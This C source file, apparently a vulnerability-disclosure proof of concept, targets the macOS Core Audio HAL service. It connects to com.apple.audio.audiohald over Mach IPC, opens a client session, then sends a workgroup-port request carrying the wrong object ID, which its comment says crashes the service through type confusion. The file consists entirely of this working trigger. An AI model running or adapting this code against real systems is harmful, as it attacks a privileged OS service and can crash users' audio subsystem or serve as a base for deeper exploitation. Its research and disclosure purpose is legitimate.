/* 
Copyright 2025 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <launch.h>
#include <string.h>
#include <servers/bootstrap.h>
#include <mach/vm_map.h>

#define XSYSTEM_OPEN_MSG_SIZE 0x38
#define XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE 0x24

typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_port_descriptor_t descriptor[1];
    char body[];
} xsystemopen_mach_message;

typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;
} xworkgroup_mach_message;

mach_port_t create_mach_port_with_send_and_receive_rights() {
    mach_port_t port;
    kern_return_t kr;

    // Allocate a port with receive rights
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to allocate port: %s\n", mach_error_string(kr));
        exit(1);
    }

    // Insert a send right for the port
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to insert send right: %s\n", mach_error_string(kr));
        exit(1);
    }

    return port; // Return the port with send rights
}

int main(int argc, char *argv[]) {
    printf("Getting started...\n");

    int opt;
    char *service_name = "com.apple.audio.audiohald";
    mach_port_t destination_port = MACH_PORT_NULL;

    mach_port_t bootstrap_port;
    kern_return_t kr = task_get_bootstrap_port(mach_task_self(), &bootstrap_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Failed to get bootstrap port, error: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("Got Bootstrap port! %d\n", bootstrap_port);

    kr = bootstrap_look_up(bootstrap_port, service_name, &destination_port);
    if (kr != KERN_SUCCESS) {
        printf("bootstrap lookup failed, error: %s\n", mach_error_string(kr));
        return 1;
    }
    printf("Got service port! %d\n", destination_port);

    mach_msg_return_t result;

    // Send _XSystem_Open message to initialize client
    xsystemopen_mach_message *xsystemopen_msg = malloc(XSYSTEM_OPEN_MSG_SIZE);

    mach_port_t reply_port;
    // Set up the memory for descriptor
    mach_port_t send_right_port = create_mach_port_with_send_and_receive_rights();

    xsystemopen_msg->msgh_descriptor_count = 1;
    xsystemopen_msg->descriptor[0].name = send_right_port;
    xsystemopen_msg->descriptor[0].disposition = MACH_MSG_TYPE_MOVE_SEND;
    xsystemopen_msg->descriptor[0].type = MACH_MSG_PORT_DESCRIPTOR;

    xsystemopen_msg->header.msgh_remote_port = destination_port;
    xsystemopen_msg->header.msgh_voucher_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_id = 1010000;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Error allocating reply port: %s\n", mach_error_string(kr));
        return kr;
    }

    xsystemopen_msg->header.msgh_local_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);

    result = mach_msg(
        &xsystemopen_msg->header,  // Pointer to the message header
        MACH_SEND_MSG,  // Send the message and then receive a reply in one call
        XSYSTEM_OPEN_MSG_SIZE,  // Send size
        0,  // Receive buffer size (larger than send size)
        send_right_port,  // Local port to receive the reply
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL 
    );

    free(xsystemopen_msg);

    fprintf(stderr, "Sent Mach message: %s\n", mach_error_string(kr));

    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Error sending Mach message: %s\n", mach_error_string(kr));
        return 1;
    }

    printf("XSystem_Open stage complete.\n");

    xworkgroup_mach_message *workgroup_msg = malloc(XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE);
    
    workgroup_msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_PORT_NULL, MACH_PORT_NULL, MACH_PORT_NULL);
    workgroup_msg->header.msgh_size = XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE;
    workgroup_msg->header.msgh_remote_port = destination_port;
    workgroup_msg->header.msgh_local_port = MACH_PORT_NULL;
    workgroup_msg->header.msgh_id = 1010059;
    
    // Arbitrary object ID (0x1 this will retrieve the HAL System type, it's expecting an IOContext type, so it will crash)
    workgroup_msg->object_id = 0x1;

    result = mach_msg(
        &workgroup_msg->header,  // Pointer to the message header
        MACH_SEND_MSG,  // Just send the message
        XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE,  // Send size
        0, // Don't need to receive this message
        MACH_PORT_NULL, // Don't need to receive this message
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL
    );

    if (result != KERN_SUCCESS) {
        fprintf(stderr, "Error in mach_msg send and receive: %s\n", mach_error_string(result));
        free(workgroup_msg);
        return 1;
    }

    free(workgroup_msg);

    printf("XIOContext_Fetch_Workgroup_Port mach message processed successfully.\n");

    return 0;
}
